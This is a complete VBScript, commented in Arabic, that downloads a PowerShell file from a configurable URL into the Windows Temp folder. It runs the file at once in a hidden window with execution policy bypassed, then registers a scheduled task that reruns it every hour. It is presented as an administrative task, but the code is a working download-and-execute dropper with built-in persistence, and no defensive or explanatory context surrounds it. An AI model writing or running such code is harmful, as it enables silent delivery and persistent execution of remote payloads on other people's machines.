' 1. إعداد المتغيرات والمسارات
Dim fileURL, savePath, taskName
fileURL = "http://example.com"  ' ضع هنا رابط ملف الـ PowerShell المراد تحميله
savePath = "C:\Windows\Temp\myscript.ps1" ' المسار المحلي لحفظ الملف
taskName = "PowerShellAdminTask"           ' اسم المهمة المجدولة

' 2. وظيفة تحميل الملف وحفظه محلياً
On Error Resume Next
Dim xmlHttp, adodbStream
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
xmlHttp.Open "GET", fileURL, False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    Set adodbStream = CreateObject("ADODB.Stream")
    adodbStream.Open
    adodbStream.Type = 1 ' 1 تعني بيانات ثنائية (Binary)
    adodbStream.Write xmlHttp.ResponseBody
    adodbStream.SaveToFile savePath, 2 ' 2 تعني إنشاء أو استبدال الملف إذا كان موجوداً
    adodbStream.Close
    Set adodbStream = Nothing
Else
    WScript.Echo "فشل تحميل الملف. رمز الخطأ: " & xmlHttp.Status
    WScript.Quit
End If
Set xmlHttp = Nothing
On Error GoTo 0

' 3. تشغيل السكربت فوراً بعد التحميل (اختياري)
Dim shellObject, runCommand
Set shellObject = CreateObject("WScript.Shell")
' تشغيل PowerShell مع تخطي سياسة التنفيذ (Execution Policy) وبشكل مخفي
runCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & savePath & """"
shellObject.Run runCommand, 0, False

' 4. إنشاء المهمة المجدولة لتشغيل السكربت تلقائياً
Dim service, rootFolder, taskDefinition, regInfo, settings, triggers, timeTrigger, actions, action
Set service = CreateObject("Schedule.Service")
Call service.Connect()

Set rootFolder = service.GetFolder("\")
Set taskDefinition = service.NewTask(0)

' إعدادات معلومات المهمة
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "مهمة إدارية مجدولة لتشغيل سكربت PowerShell"
regInfo.Author = "Administrator"

' إعدادات الأمان والتشغيل
Set settings = taskDefinition.Settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False

' إعداد نظام الإطلاق (Trigger) ليعمل لمرة واحدة أو يتكرر
Set triggers = taskDefinition.Triggers
Set timeTrigger = triggers.Create(1) ' 1 تعني Time Trigger

' تحديد وقت البدء بناءً على الوقت الحالي للنظام
Dim objWMIService, colItems, objItem, localTime
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_LocalTime")
For Each objItem in colItems
    localTime = objItem.Year & "-" & Right("0" & objItem.Month, 2) & "-" & Right("0" & objItem.Day, 2) & "T" & Right("0" & objItem.Hour, 2) & ":" & Right("0" & objItem.Minute, 2) & ":00"
Next

timeTrigger.StartBoundary = localTime
timeTrigger.ExecutionTimeLimit = "PT0S"

' إعداد التكرار (مثال: تكرار كل ساعة)
Set repetitionPattern = timeTrigger.Repetition
repetitionPattern.Interval = "PT1H" ' PT1H تعني تكرار كل ساعة واحدة (1 Hour)
repetitionPattern.StopAtDurationEnd = False

' تحديد الإجراء (Action): تشغيل بيئة PowerShell وتمرير السكربت كمعامل
Set actions = taskDefinition.Actions
Set action = actions.Create(0) ' 0 تعني Exec Action
action.Path = "powershell.exe"
action.Arguments = "-NoProfile -ExecutionPolicy Bypass -File """ & savePath & """"

' تسجيل وحفظ المهمة في النظام بأعلى صلاحيات متاحة للمستخدم الحالي
Call rootFolder.RegisterTaskDefinition(taskName, taskDefinition, 6, , , 3)

WScript.Echo "تم تحميل السكربت وتفعيله، وإنشاء المهمة المجدولة بنجاح."
